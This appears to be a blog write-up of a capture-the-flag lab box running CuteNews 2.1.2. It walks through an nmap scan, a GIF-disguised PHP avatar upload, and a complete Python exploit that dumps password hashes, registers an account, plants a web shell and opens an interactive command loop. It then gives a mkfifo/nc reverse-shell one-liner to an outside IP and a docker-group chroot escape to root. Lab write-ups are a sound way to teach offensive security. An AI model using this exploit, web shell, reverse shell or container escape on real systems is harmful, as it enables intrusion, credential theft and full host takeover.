---
layout: default
title : muzec - zSecurity Cute Writeup
---

![image](https://user-images.githubusercontent.com/69868171/117589900-8f742c00-b0fa-11eb-8457-a8a011ea58c5.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 16:13 EDT
Nmap scan report for 10.10.12.101
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5c:98:a2:10:30:e3:65:4e:88:96:05:7b:b3:9d:0f:3c (RSA)
|   256 de:fd:60:5f:39:b3:c4:c6:7f:aa:bc:5c:64:7c:7c:e2 (ECDSA)
|_  256 00:41:7d:63:29:57:36:64:bc:00:ec:8f:e4:41:5f:d0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Please Login / CuteNews
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.12 seconds
```

We got 2 open ports 22 SSH and 80 HTTP and we are hitting the port 80 first.

![image](https://user-images.githubusercontent.com/69868171/117589900-8f742c00-b0fa-11eb-8457-a8a011ea58c5.png)

CuteNews 2.1.2 found some really intersting exploit to use in exploiting it but let try doing it manually first.

![image](https://user-images.githubusercontent.com/69868171/117590001-62744900-b0fb-11eb-9a49-0748e48c0d84.png)

Now let try to register first.

![image](https://user-images.githubusercontent.com/69868171/117590017-9485ab00-b0fb-11eb-9e70-83b0b36092c6.png)

The Captcha page was hiddin in the source code `http://10.10.12.101/captcha.php` .

![image](https://user-images.githubusercontent.com/69868171/117590076-bbdc7800-b0fb-11eb-93f1-e4a536a1d766.png)

And we are in.

![image](https://user-images.githubusercontent.com/69868171/117590087-cc8cee00-b0fb-11eb-9885-e30e8d6bf038.png)

According to the exploit we can a reverse shell code but we need to add a GIF magic nummber like that below;

![image](https://user-images.githubusercontent.com/69868171/117590179-14137a00-b0fc-11eb-8c95-3c73762ce6dd.png)

![image](https://user-images.githubusercontent.com/69868171/117590194-21c8ff80-b0fc-11eb-951e-c84ea2838f02.png)

So the web server we think we are uploading a GIF image which is a PHP file.

![image](https://user-images.githubusercontent.com/69868171/117590212-49b86300-b0fc-11eb-88ea-30ad68b98f5e.png)

Uploaded now some of the problem i face is when i try accessing the upload file but it refuse to load i think the website it broken.

![image](https://user-images.githubusercontent.com/69868171/117590265-969c3980-b0fc-11eb-8df1-1543fec457d9.png)

Definitely broken so i go back to use the python exploit script for the CuteNews 2.1.2 .

![image](https://user-images.githubusercontent.com/69868171/117590317-e418a680-b0fc-11eb-990f-8eaad0bf4088.png)

Note:- remove all the CuteNews in the exploit it should be like the below one;

```
#! /bin/env python3

import requests
from base64 import b64decode
import io
import re
import string
import random
import sys


banner = """


           _____     __      _  __                     ___   ___  ___ 
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                                ___  _________                        
                               / _ \/ ___/ __/                        
                              / , _/ /__/ _/                          
                             /_/|_|\___/___/                          
                                                                      

                                                                                                                                                   
"""
print (banner)
print ("[->] Usage python3 expoit.py")
print ()
sess = requests.session()
payload = "GIF8;\n<?php system($_REQUEST['cmd']) ?>"
ip = input("Enter the URL> ")
def extract_credentials():
    global sess, ip
    url = f"{ip}/cdata/users/lines"
    encoded_creds = sess.get(url).text
    buff = io.StringIO(encoded_creds)
    chash = buff.readlines()
    if "Not Found" in encoded_creds:
            print ("[-] No hashes were found skipping!!!")
            return
    else:
        for line in chash:
            if "<?php die('Direct call - access denied'); ?>" not in line:
                credentials = b64decode(line)
                try:
                    sha_hash = re.search('"pass";s:64:"(.*?)"', credentials.decode()).group(1)
                    print (sha_hash)
                except:
                    pass
def register():
    global sess, ip
    userpass = "".join(random.SystemRandom().choice(string.ascii_letters + string.digits ) for _ in range(10))
    postdata = {
        "action" : "register",
        "regusername" : userpass,
        "regnickname" : userpass,
        "regpassword" : userpass,
        "confirm" : userpass,
        "regemail" : f"{userpass}@hack.me"
    }
    register = sess.post(f"{ip}/index.php?register", data = postdata, allow_redirects = False)
    if 302 == register.status_code:
        print (f"[+] Registration successful with username: {userpass} and password: {userpass}")
    else:
        sys.exit()
def send_payload(payload):
    global ip
    token = sess.get(f"{ip}/index.php?mod=main&opt=personal").text
    signature_key = re.search('signature_key" value="(.*?)"', token).group(1)
    signature_dsi = re.search('signature_dsi" value="(.*?)"', token).group(1)
    logged_user = re.search('disabled="disabled" value="(.*?)"', token).group(1)
    print (f"signature_key: {signature_key}")
    print (f"signature_dsi: {signature_dsi}")
    print (f"logged in user: {logged_user}")

    files = {
        "mod" : (None, "main"),
        "opt" : (None, "personal"),
        "__signature_key" : (None, f"{signature_key}"),
        "__signature_dsi" : (None, f"{signature_dsi}"),
        "editpassword" : (None, ""),
        "confirmpassword" : (None, ""),
        "editnickname" : (None, logged_user),
        "avatar_file" : (f"{logged_user}.php", payload),
        "more[site]" : (None, ""),
        "more[about]" : (None, "")
    }
    payload_send = sess.post(f"{ip}/index.php", files = files).text
    print("============================\nDropping to a SHELL\n============================")
    while True:
        print ()
        command = input("command > ")
        postdata = {"cmd" : command}
        output = sess.post(f"{ip}/uploads/avatar_{logged_user}_{logged_user}.php", data=postdata)
        if 404 == output.status_code:
            print ("sorry i can't find your webshell try running the exploit again")
            sys.exit()
        else:
            output = re.sub("GIF8;", "", output.text)
            print (output.strip())

if __name__ == "__main__":
    print ("================================================================\nUsers SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN\n================================================================")
    extract_credentials()
    print ("================================================================")
    print()
    print ("=============================\nRegistering a users\n=============================")
    register()
    print()
    print("=======================================================\nSending Payload\n=======================================================")
    send_payload(payload)
    print ()
```

Now time to run the exploit.

![image](https://user-images.githubusercontent.com/69868171/117590453-83d63480-b0fd-11eb-86e1-3405883af81d.png)

We need to enter the target url .

![image](https://user-images.githubusercontent.com/69868171/117590491-a9633e00-b0fd-11eb-8d46-2b535e18d0a3.png)

we have shell but it a dumb one let start an Ncat listener to transfer the shell.

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

![image](https://user-images.githubusercontent.com/69868171/117590540-ff37e600-b0fd-11eb-9e43-8c3b692948aa.png)

![image](https://user-images.githubusercontent.com/69868171/117590565-1f67a500-b0fe-11eb-928c-837871cbea97.png)

And we have shell.

![image](https://user-images.githubusercontent.com/69868171/117590586-3ad2b000-b0fe-11eb-8778-17d582891247.png)

Spawn a TTY shell and let move on to get the user.txt .

![image](https://user-images.githubusercontent.com/69868171/117590605-59d14200-b0fe-11eb-884d-28cf6e6b7758.png)

### Privilege Escalation

Ok checking seems we are on the docker group let hit gtfobins it can be used to break out from restricted environments by spawning an interactive system shell which we result to root shell.

![image](https://user-images.githubusercontent.com/69868171/117590753-dd8b2e80-b0fe-11eb-856f-8e3b72e66337.png)


![image](https://user-images.githubusercontent.com/69868171/117590763-e5e36980-b0fe-11eb-9ee2-7cc3f6172b7a.png)

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

![image](https://user-images.githubusercontent.com/69868171/117590794-16c39e80-b0ff-11eb-8008-114944695822.png)

And we are root let get the root.txt .

![image](https://user-images.githubusercontent.com/69868171/117590834-4a062d80-b0ff-11eb-86f4-8becdb017311.png)

And we are done .

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>

